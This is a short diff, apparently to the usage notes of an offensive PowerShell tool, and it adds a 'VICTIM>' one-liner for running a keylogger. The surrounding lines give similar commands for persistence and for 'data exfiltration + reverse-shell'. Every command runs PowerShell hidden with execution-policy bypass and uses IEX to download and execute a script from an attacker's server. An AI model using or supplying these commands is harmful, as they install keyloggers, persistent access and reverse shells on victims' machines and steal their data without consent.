@@ -17,6 +17,9 @@ VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClie
 #For running a persistent command (by default runs every hour for 6 days, but can be changed in `client_pers.ps1`)
 VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/pers");"
 
+#For running a keylogger
+VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/klogger");"
+
 #For running data exfiltration + reverse-shell
 VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/all");"
 ```
